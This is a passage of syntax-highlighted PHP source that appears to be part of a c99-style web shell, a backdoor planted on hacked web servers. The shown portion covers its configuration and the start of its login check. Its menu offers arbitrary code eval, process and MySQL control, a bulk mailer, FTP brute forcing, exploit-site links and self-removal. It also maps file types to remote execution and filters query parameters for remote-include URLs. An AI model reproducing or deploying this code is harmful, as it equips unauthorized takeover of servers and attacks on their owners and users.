<span class="lineno"> 140</span>   <span class="k">foreach</span> <span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;&amp;&quot;</span><span class="p">,</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;QUERY_STRING&quot;</span><span class="p">))</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 141</span>     <span class="nv">$v</span>       <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">,</span><span class="nv">$v</span><span class="p">);</span>
<span class="lineno"> 142</span>     <span class="nv">$name</span>    <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="lineno"> 143</span>     <span class="nv">$value</span>   <span class="o">=</span> <span class="o">@</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="lineno"> 144</span>     <span class="nv">$needles</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;http://&quot;</span><span class="p">,</span><span class="s2">&quot;https://&quot;</span><span class="p">,</span><span class="s2">&quot;ssl://&quot;</span><span class="p">,</span><span class="s2">&quot;ftp://&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno"> 145</span>     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$needles</span> <span class="k">as</span> <span class="nv">$needle</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 146</span>       <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="nv">$needle</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 147</span>         <span class="nv">$includestr</span> <span class="o">.=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;&quot;</span><span class="p">;</span>
<span class="lineno"> 148</span>       <span class="p">}</span>
<span class="lineno"> 149</span>     <span class="p">}</span>
<span class="lineno"> 150</span>   <span class="p">}</span>
<span class="lineno"> 151</span> <span class="p">}</span>
<span class="lineno"> 152</span> <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$surl</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$surl</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="s2">&quot;?&quot;</span><span class="o">.@</span><span class="nv">$includestr</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno"> 153</span> <span class="c1">###[ QUICK LAUNCH ]###</span>
<span class="lineno"> 154</span> <span class="nv">$quicklaunch</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno"> 155</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=home</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Home</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="p">),</span>
<span class="lineno"> 156</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=back</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Back</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">history.back(1)&quot;</span><span class="p">),</span>
<span class="lineno"> 157</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=forward</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Forward</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">history.go(1)&quot;</span><span class="p">),</span>
<span class="lineno"> 158</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=up</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Up</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=%upd&amp;sort=%sort&quot;</span><span class="p">),</span>
<span class="lineno"> 159</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=search</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Search</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=search&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 160</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=buffer</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Buffer</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=fsbuff&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 161</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=help</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">About</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=about&quot;</span><span class="p">),</span>
<span class="lineno"> 162</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">),</span>
<span class="lineno"> 163</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Security&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=security&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 164</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Processes&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=processes&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 165</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;MySQL&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=sql&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 166</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Eval&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=eval&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 167</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Encoder&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=encoder&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 168</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Mailer&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=fxmailer&quot;</span><span class="p">),</span>
<span class="lineno"> 169</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Toolz&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=tools&amp;d=%d&quot;</span><span class="p">),</span>
<span class="lineno"> 170</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;milw0rm&quot;</span><span class="p">,</span><span class="nx">milw0rm</span><span class="p">()),</span>
<span class="lineno"> 171</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Md5 Lookup&quot;</span><span class="p">,</span><span class="s2">&quot;http://darkc0de.com/database/md5lookup.html&quot;</span><span class="p">),</span>
<span class="lineno"> 172</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Images&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=listall&quot;</span><span class="p">),</span>
<span class="lineno"> 173</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Feedback&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=feedback&quot;</span><span class="p">),</span>
<span class="lineno"> 174</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Update&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=update&quot;</span><span class="p">),</span>
<span class="lineno"> 175</span>     <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Kill Shell&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=selfremove&quot;</span><span class="p">)</span>
<span class="lineno"> 176</span> <span class="p">);</span>
<span class="lineno"> 177</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno"> 178</span> <span class="nv">$quicklaunch</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&lt;br&gt;FTP Brute&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ftpquickbrute&amp;d=%d&quot;</span><span class="p">);</span>
<span class="lineno"> 179</span> <span class="p">}</span>
<span class="lineno"> 180</span> <span class="c1">###[ FILE TYPES ]###</span>
<span class="lineno"> 181</span> <span class="nv">$ftypes</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno"> 182</span>   <span class="s2">&quot;html&quot;</span>     <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;html&quot;</span><span class="p">,</span><span class="s2">&quot;htm&quot;</span><span class="p">,</span><span class="s2">&quot;shtml&quot;</span><span class="p">),</span>
<span class="lineno"> 183</span>   <span class="s2">&quot;txt&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;txt&quot;</span><span class="p">,</span><span class="s2">&quot;conf&quot;</span><span class="p">,</span><span class="s2">&quot;bat&quot;</span><span class="p">,</span><span class="s2">&quot;sh&quot;</span><span class="p">,</span><span class="s2">&quot;js&quot;</span><span class="p">,</span><span class="s2">&quot;bak&quot;</span><span class="p">,</span><span class="s2">&quot;doc&quot;</span><span class="p">,</span><span class="s2">&quot;log&quot;</span><span class="p">,</span><span class="s2">&quot;sfc&quot;</span><span class="p">,</span><span class="s2">&quot;cfg&quot;</span><span class="p">,</span><span class="s2">&quot;htaccess&quot;</span><span class="p">),</span>
<span class="lineno"> 184</span>   <span class="s2">&quot;exe&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;sh&quot;</span><span class="p">,</span><span class="s2">&quot;install&quot;</span><span class="p">,</span><span class="s2">&quot;bat&quot;</span><span class="p">,</span><span class="s2">&quot;cmd&quot;</span><span class="p">,</span><span class="s2">&quot;sys&quot;</span><span class="p">,</span><span class="s2">&quot;com&quot;</span><span class="p">),</span>
<span class="lineno"> 185</span>   <span class="s2">&quot;ini&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ini&quot;</span><span class="p">,</span><span class="s2">&quot;inf&quot;</span><span class="p">,</span><span class="s2">&quot;conf&quot;</span><span class="p">),</span>
<span class="lineno"> 186</span>   <span class="s2">&quot;code&quot;</span>     <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;php&quot;</span><span class="p">,</span><span class="s2">&quot;phtml&quot;</span><span class="p">,</span><span class="s2">&quot;php3&quot;</span><span class="p">,</span><span class="s2">&quot;php4&quot;</span><span class="p">,</span><span class="s2">&quot;inc&quot;</span><span class="p">,</span><span class="s2">&quot;tcl&quot;</span><span class="p">,</span><span class="s2">&quot;h&quot;</span><span class="p">,</span><span class="s2">&quot;c&quot;</span><span class="p">,</span><span class="s2">&quot;cpp&quot;</span><span class="p">,</span><span class="s2">&quot;py&quot;</span><span class="p">,</span><span class="s2">&quot;cgi&quot;</span><span class="p">,</span><span class="s2">&quot;pl&quot;</span><span class="p">),</span>
<span class="lineno"> 187</span>   <span class="s2">&quot;img&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;gif&quot;</span><span class="p">,</span><span class="s2">&quot;png&quot;</span><span class="p">,</span><span class="s2">&quot;jpeg&quot;</span><span class="p">,</span><span class="s2">&quot;jfif&quot;</span><span class="p">,</span><span class="s2">&quot;jpg&quot;</span><span class="p">,</span><span class="s2">&quot;jpe&quot;</span><span class="p">,</span><span class="s2">&quot;bmp&quot;</span><span class="p">,</span><span class="s2">&quot;ico&quot;</span><span class="p">,</span><span class="s2">&quot;tif&quot;</span><span class="p">,</span><span class="s2">&quot;tiff&quot;</span><span class="p">,</span><span class="s2">&quot;avi&quot;</span><span class="p">,</span><span class="s2">&quot;mpg&quot;</span><span class="p">,</span><span class="s2">&quot;mpeg&quot;</span><span class="p">),</span>
<span class="lineno"> 188</span>   <span class="s2">&quot;sdb&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;sdb&quot;</span><span class="p">),</span>
<span class="lineno"> 189</span>   <span class="s2">&quot;phpsess&quot;</span>  <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;sess&quot;</span><span class="p">),</span>
<span class="lineno"> 190</span>   <span class="s2">&quot;download&quot;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;exe&quot;</span><span class="p">,</span><span class="s2">&quot;com&quot;</span><span class="p">,</span><span class="s2">&quot;sys&quot;</span><span class="p">,</span><span class="s2">&quot;pif&quot;</span><span class="p">,</span><span class="s2">&quot;src&quot;</span><span class="p">,</span><span class="s2">&quot;lnk&quot;</span><span class="p">,</span><span class="s2">&quot;zip&quot;</span><span class="p">,</span><span class="s2">&quot;rar&quot;</span><span class="p">,</span><span class="s2">&quot;gz&quot;</span><span class="p">,</span><span class="s2">&quot;tar&quot;</span><span class="p">,</span><span class="s2">&quot;pdf&quot;</span><span class="p">)</span>
<span class="lineno"> 191</span> <span class="p">);</span>
<span class="lineno"> 192</span> <span class="nv">$exeftypes</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno"> 193</span>   <span class="s2">&quot;php -q %f%&quot;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;php&quot;</span><span class="p">,</span><span class="s2">&quot;php3&quot;</span><span class="p">,</span><span class="s2">&quot;php4&quot;</span><span class="p">),</span>
<span class="lineno"> 194</span>   <span class="s2">&quot;perl %f%&quot;</span>   <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pl&quot;</span><span class="p">,</span><span class="s2">&quot;cgi&quot;</span><span class="p">)</span>
<span class="lineno"> 195</span> <span class="p">);</span>
<span class="lineno"> 196</span> <span class="nv">$regxp_highlight</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno"> 197</span>   <span class="k">array</span><span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_SELF&quot;</span><span class="p">]),</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#FF6600&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 198</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.tgz$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#C082FF&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 199</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.gz$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#C082FF&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 200</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.tar$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#C082FF&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 201</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.bz2$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#C082FF&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 202</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.zip$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#C082FF&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 203</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.rar$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#C082FF&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 204</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.php$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#00FF00&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 205</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.php3$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#00FF00&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 206</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.php4$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#00FF00&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 207</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.jpg$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#00FFFF&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 208</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.jpeg$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#00FFFF&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 209</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.JPG$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#00FFFF&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 210</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.JPEG$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#00FFFF&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 211</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.ico$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#00FFFF&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 212</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.gif$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#00FFFF&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 213</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.png$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#00FFFF&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 214</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.htm$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#00CCFF&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 215</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.html$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#00CCFF&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 216</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.txt$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#C0C0C0&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">),</span>
<span class="lineno"> 217</span>   <span class="k">array</span><span class="p">(</span><span class="s2">&quot;\.pdf$&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&lt;font color=#FF99CC&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">)</span>
<span class="lineno"> 218</span> <span class="p">);</span>
<span class="lineno"> 219</span> <span class="c1">###[ HIGHLIGHT CODE ]###</span>
<span class="lineno"> 220</span> <span class="nv">$highlight_bg</span>      <span class="o">=</span> <span class="s2">&quot;#E0E0E0&quot;</span><span class="p">;</span>
<span class="lineno"> 221</span> <span class="nv">$highlight_comment</span> <span class="o">=</span> <span class="s2">&quot;#FF6600&quot;</span><span class="p">;</span>
<span class="lineno"> 222</span> <span class="nv">$highlight_default</span> <span class="o">=</span> <span class="s2">&quot;#000080&quot;</span><span class="p">;</span>
<span class="lineno"> 223</span> <span class="nv">$highlight_html</span>    <span class="o">=</span> <span class="s2">&quot;#1300FF&quot;</span><span class="p">;</span>
<span class="lineno"> 224</span> <span class="nv">$highlight_keyword</span> <span class="o">=</span> <span class="s2">&quot;#007700&quot;</span><span class="p">;</span>
<span class="lineno"> 225</span> <span class="nv">$highlight_string</span>  <span class="o">=</span> <span class="s2">&quot;#FF0000&quot;</span><span class="p">;</span>
<span class="lineno"> 226</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.bg&quot;</span><span class="p">,</span><span class="nv">$highlight_bg</span><span class="p">);</span>
<span class="lineno"> 227</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.comment&quot;</span><span class="p">,</span><span class="nv">$highlight_comment</span><span class="p">);</span>
<span class="lineno"> 228</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.default&quot;</span><span class="p">,</span><span class="nv">$highlight_default</span><span class="p">);</span>
<span class="lineno"> 229</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.html&quot;</span><span class="p">,</span><span class="nv">$highlight_html</span><span class="p">);</span>
<span class="lineno"> 230</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.keyword&quot;</span><span class="p">,</span><span class="nv">$highlight_keyword</span><span class="p">);</span>
<span class="lineno"> 231</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.string&quot;</span><span class="p">,</span><span class="nv">$highlight_string</span><span class="p">);</span>
<span class="lineno"> 232</span> <span class="c1">###########################################</span>
<span class="lineno"> 233</span> <span class="c1">###[ END OF CONFIGURATIONS ]###</span>
<span class="lineno"> 234</span> <span class="c1">###########################################</span>
<span class="lineno"> 235</span> <span class="c1">##############################</span>
<span class="lineno"> 236</span> <span class="c1">###[ AUTHENTICATE ]###</span>
<span class="lineno"> 237</span> <span class="c1">##############################</span>
<span class="lineno"> 238</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$auth</span><span class="p">[</span><span class="s2">&quot;hostallow&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$tmp</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">*&quot;</span><span class="p">,</span><span class="s2">&quot;.*&quot;</span><span class="p">,</span><span class="nb">preg_quote</span><span class="p">(</span><span class="nv">$v</span><span class="p">));</span> <span class="p">}</span>
<span class="lineno"> 239</span> <span class="nv">$s</span> <span class="o">=</span> <span class="s2">&quot;!^(&quot;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)$!i&quot;</span><span class="p">;</span>
<span class="lineno"> 240</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">))</span> <span class="k">and</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span><span class="nb">gethostbyaddr</span><span class="p">(</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">))))</span> <span class="p">{</span>
<span class="lineno"> 241</span>   <span class="k">exit</span><span class="p">(</span><span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="si">$sh_mainurl\</span><span class="s2">&quot;</span><span class="o">&gt;</span><span class="s2">&quot;.sh_name().&quot;</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span><span class="nx">ACCESS</span> <span class="nx">DENIED</span><span class="o">!</span> <span class="nx">Your</span> <span class="nx">host</span> <span class="p">(</span><span class="s2">&quot;.getenv(&quot;</span><span class="nx">REMOTE_ADDR</span><span class="s2">&quot;).&quot;</span><span class="p">)</span> <span class="k">not</span> <span class="nx">allowed</span><span class="o">!</span><span class="s2">&quot;);</span>
<span class="lineno"> 242</span> <span class="s2">}</span>
<span class="lineno"> 243</span> <span class="s2">if (!empty(</span><span class="si">$auth[&quot;login&quot;]</span><span class="s2">)) {</span>
<span class="lineno"> 244</span> <span class="s2">  if (empty(</span><span class="si">$auth[&quot;md5pass&quot;]</span><span class="s2">)) { </span><span class="si">$auth[&quot;md5pass&quot;]</span><span class="s2"> = md5(</span><span class="si">$auth[&quot;pass&quot;]</span><span class="s2">); }</span>
<span class="lineno"> 245</span> <span class="s2">  if ((</span><span class="si">$_SERVER[&quot;PHP_AUTH_USER&quot;]</span><span class="s2"> != </span><span class="si">$auth[&quot;login&quot;]</span><span class="s2">) or (md5(</span><span class="si">$_SERVER[&quot;PHP_AUTH_PW&quot;]</span><span class="s2">) != </span><span class="si">$auth[&quot;md5pass&quot;]</span><span class="s2">)) {</span>
